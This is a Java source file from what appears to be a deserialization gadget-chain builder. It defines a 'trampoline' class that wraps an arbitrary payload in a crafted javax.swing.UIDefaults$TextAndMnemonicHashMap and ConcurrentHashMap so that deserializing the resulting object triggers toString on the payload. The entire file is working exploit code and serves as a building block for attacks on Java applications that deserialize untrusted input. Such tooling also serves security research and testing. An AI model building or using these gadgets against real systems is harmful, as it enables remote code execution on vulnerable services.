package org.ses.gadgetbuilder.impl.trampolines.tostring;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.chains.trampolines.noparam.ToStringTrampoline;
import org.ses.gadgetbuilder.impl.trampolines.equals.ConcurrentHashMapEquals;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Array;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.concurrent.ConcurrentHashMap;

/**
 * https://github.com/BofeiC/JDD-PocLearning/blob/main/src/main/java/gadgetFragment/ToStringFragment.java
 */

@Authors(Authors.BofeiC)
public class UIDefaultsToStringTrampoline implements ToStringTrampoline {
    @Override
    public Object wrapPayload(Object payload) throws Exception {
        Class clazz = Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Object textAndMnemonicHashMap = Reflections.createWithoutConstructor(clazz);
        Method method = clazz.getMethod("put", new Class[]{Object.class, Object.class});
        int elementCount = 5;
        for (int i=0; i < elementCount; i++)
            method.invoke(textAndMnemonicHashMap, new Object[]{"Foo", "Bar"});

        Reflections.setFieldValue(textAndMnemonicHashMap, "loadFactor", 0.75f);

        ConcurrentHashMap map = new ConcurrentHashMap<>();
        map.put(payload, "FooBar");

        ConcurrentHashMapEquals equalsTrampoline = new ConcurrentHashMapEquals();
        return equalsTrampoline.wrapPayload(map, textAndMnemonicHashMap);
    }
}
